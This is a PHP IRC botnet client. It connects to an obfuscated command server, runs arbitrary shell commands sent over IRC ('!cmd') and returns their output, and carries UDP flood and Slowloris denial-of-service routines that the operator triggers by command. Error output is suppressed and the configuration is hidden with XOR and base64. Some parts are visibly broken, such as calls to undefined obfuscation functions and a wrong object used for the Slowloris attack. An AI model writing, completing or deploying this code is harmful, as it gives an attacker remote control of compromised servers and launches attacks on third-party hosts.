<?php
set_time_limit(0);
ini_set('display_errors', 'off');
error_reporting(0);

$config = array( 
        'server' => irc.acre.gov.br('SVI4dkdFTkZKeFVxUml3a2VGNDdLdz09'), 
        'port'   => 6667, 
        'channel' => macacosnetwork('YXc4NVFsND0='),
        'name'   => evilmachine('S2hnNFFtaFlNRGs9').exec('hostname').'-'.exec('whoami').'-'.strval(rand(1,1000)), 
        'nick'   => evilmachine1('S2hnNFFtaFlNRGs9').exec('hostname').'-'.exec('whoami').'-'.strval(rand(1,1000)), 
        'pass'   => (''), 
);
                                 
function snowden($string) {

 $white = base64_decode(base64_decode('U0cxTU5pbzNSR1pGTTBCZVZqRkpURWx1WHk0K1YwQnJNMVZ3S1FvPQo='));
 $text = base64_decode(base64_decode($string));
 $black = '';

 for($i=0,$j=0;($i<strlen($text) && $j<strlen($white));$i++,$j++)
 {
         $black .= $text{$i} ^ $white{$j};
 }

 return $black;
}

class slowloris {
	public function startSlowloris($params)
	{
		$pids = array();
		$host = $params['host'];
		$port = $params['port'];
		$method = $params['method'];
		$threads = $params['threads'];
        	$maxTime = time() + intval($params['time']);

        	while(1){
                	if (time() > $maxTime){
                        	foreach($pids as $pid){
                                	posix_kill($pid, 9);
	                                break;
        	                }
	                }
	                for ($i = 0; $i < $threads; $i++){
	                    $pid = pcntl_fork();
	                    if ($pid == -1){
	                        break;
	                    }elseif($pid){
	                        //parent process
	                        $pids[] = $pid;
	                    }else{
	                        //child process
	                        if(($method == 'post') || ($method == 'POST'))
	                        {
	                                attack_post($host, $port);
	                        }elseif(($method == 'get') || ($method == 'GET')) {
        	                        attack_get($host, $port);
	                        }else{
	                                exit();
	                        }
	                        #exit(0);
	                    }
	                }
	        }
		return "Code: Complete";
	
	}
	public function checkProto($host){
	        $comps = parse_url($host);
	        if(in_array("http", $comps)){
	                return "http";
	        } elseif(in_array("https")){
	                return "https";
	        }
	}
	public function attack_get($host,$port){
	        if(checkProto($host) == "http"){
	                $request  = "GET /".md5(rand())." HTTP/1.1\r\n";
	        } elseif(checkProto($host) == "https"){
	                $request  = "GET /".md5(rand())." HTTPS/1.1\r\n";
	        } else{
	                exit();
	        }
	        $request .= "Host: $host\r\n";
	        $request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";
	        $request .= "Keep-Alive: 900\r\n";
	        $request .= "Content-Length: " . rand(10000, 1000000) . "\r\n";
	        $request .= "Accept: *.*\r\n";
	        $request .= "X-a: " . rand(1, 10000) . "\r\n";
	
	        $sockfd = @fsockopen($host, intval($port), $errno, $errstr);
	        @fwrite($sockfd, $request);
	
	        while (true){
	                if (@fwrite($sockfd, "X-c:" . rand(1, 100000) . "\r\n")){
	                    sleep(15);
	                }else{
	                    $sockfd = @fsockopen($host, intval($port), $errno, $errstr);
	                    @fwrite($sockfd, $request);
	                }
	        }
	}
	public function attack_post($host,$port){
        	if(checkProto($host) == "http"){
	                $request  = "POST /".md5(rand())." HTTP/1.1\r\n";
	        } elseif(checkProto($host) == "https"){
	                $request  = "POST /".md5(rand())." HTTPS/1.1\r\n";
	        }else{
	                exit();
	        }
	        $request .= "Host: $host\r\n";
	        $request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";
	        $request .= "Keep-Alive: 900\r\n";
	        $request .= "Content-Length: 1000000000\r\n";
	        $request .= "Content-Type: application/x-www-form-urlencoded\r\n";
	        $request .= "Accept: *.*\r\n";
	
	        $sockfd = @fsockopen($host, intval($port), $errno, $errstr);
	        @fwrite($sockfd, $request);
	
	        while (true){
	                if (@fwrite($sockfd, ".") !== FALSE){
	                    sleep(1);
	                }else{
	                    $sockfd = @fsockopen($host, intval($port), $errno, $errstr);
	                    @fwrite($sockfd, $request);
	                }
	        }
	}
}
class udpFlood {
	public function startFlood($params)
	{	
		$host = $params['host'];
		$port = $params['port'];
		$maxTime = time() + intval($params['time']);

		$packets = 0;
		$rand = false;		
		$data = str_pad("X", 3500, "X");		

		while(1)
		{
			$packets++;
			if (time() > $maxTime)
			{
				break;
			}
			if($port == 0)
			{
				$rand = true;
			}
			if($rand == true)
			{
				$port = rand(1,65000);
			}
			$fp = fsockopen('udp://'.$host, $port, $errno, $errstr, 5);
			if($fp)
			{
				fwrite($fp, $data);
				fclose($fp);
			}
		}
		
		return $packets;		
	}

}	
class buttBOT {

        var $socket;
        var $buf = array();
	var $pongCount = 0;
	var $joined = false;
        // @param array
        function __construct($config)

        {
		$this->socket = fsockopen($config['server'], $config['port']);
                $this->login($config);
                $this->main($config);
        }
         //@param array

        function login($config)
        {
                $this->send_data('USER', $config['nick'].' null '.$config['nick'].' :'.$config['name']);
                $this->send_data('NICK', $config['nick']);
        }
        function main($config)
        {             
                $data = fgets($this->socket, 256);
                $this->buf = explode(' ', $data);

                if($this->buf[0] == 'PING')
                {
                        $this->send_data('PONG', $this->buf[1]);
			$this->pongCount++;
                }
		if(($this->pongCount >= 1) && ($this->joined == false))
		{
			$this->join_channel($config['channel']);
			$this->joined = true;
		}
		$command = '';
		if(count($this->buf) >= 4)
		{
              		$command = str_replace(array(chr(10), chr(13)), '', $this->buf[3]);
		}
                switch($command) 
                {                      
                        case ':!cmd':
                                $message = "";
				$cmd = "";
                                for($i=4; $i < (count($this->buf)); $i++)
                                {
                                        $cmd .= $this->buf[$i]." ";
                                }
				$message = shell_exec(trim($cmd));
				$message = preg_replace("/\r|\n|\r\n/", " <br> ", $message);
				preg_match('~:(.*?)!~', $this->buf[0], $master);
				$this->send_data('PRIVMSG '.$master[1].' :', $message);
                                break;                     
                        case ':!say':
                                $message = "";
                                for($i=4; $i < (count($this->buf)); $i++)
                                {
                                        $message .= $this->buf[$i]." ";
                                }
                                $this->send_data('PRIVMSG '.$this->buf[2].' :', $message);
                                break;                        		
			case ':!udp':
				$params = array();
				preg_match('~:(.*?)!~', $this->buf[0], $master);
				if(count($this->buf) == 7)
				{
					$params = array(
						'host' => $this->buf[4],
						'port' => $this->buf[5],
						'time' => $this->buf[6]
						);
					$udpFlood = new udpFlood();
					$packets = $udpFlood->startFlood($params);
                                	$this->send_data('PRIVMSG '.$master[1].' :', 'UDP FLOOD COMPLETE - '.strval($packets).' packets sent!');
				} else {
                                $this->send_data('PRIVMSG '.$master[1].' :', 'ERROR: host port time');
				}
			case ':!slowloris':
				$params = array();
				preg_match('~:(.*?)!~', $this->buf[0], $master);
				if(count($this->buf) == 9)
				{
					$params = array(
						'host' => $this->buf[4],
						'port' => $this->buf[5],
						'method' => $this->buf[6],
						'threads' => $this->buf[7],
						'time' => $this->buf[8]
						);
					$slowloris = new slowloris();
					$status = $udpFlood->startSlowloris($params);
                                	$this->send_data('PRIVMSG '.$master[1].' :', 'SLOWLORIS COMPLETE - '.strval($status));
				} else {
                                $this->send_data('PRIVMSG '.$master[1].' :', 'ERROR: host port http_method threads time(s)');
				}		
                }		

                $this->main($config);
        }
        function send_data($cmd, $msg = null) 
        {
                if($msg == null)
                {
                        fputs($this->socket, $cmd."\r\n");
                } elseif ($msg != null){
			if(strlen($msg) >= 245) {
				$msgArray = str_split($msg, 245);
				foreach ($msgArray as $chunk) {
                        		fputs($this->socket, $cmd.' '.$chunk."\r\n");
				}
			}
			elseif(strlen($msg) < 245){
                        	fputs($this->socket, $cmd.' '.$msg."\r\n");
			}
                }

        }
        function join_channel($channel) 
        {

                if(is_array($channel))
                {
                        foreach($channel as $chan)
                        {
                                $this->send_data('JOIN', $chan);
                        }

                } else {
                        $this->send_data('JOIN', $channel);
                }
        }     
}
$mutex = fopen('/tmp/dp.lock', 'wr+');
if (!flock($mutex, LOCK_EX | LOCK_NB)) {
	exit;
}
$bot = new buttBOT($config);
flock($mutex, LOCK_UN);
fclose($mutex);
?>
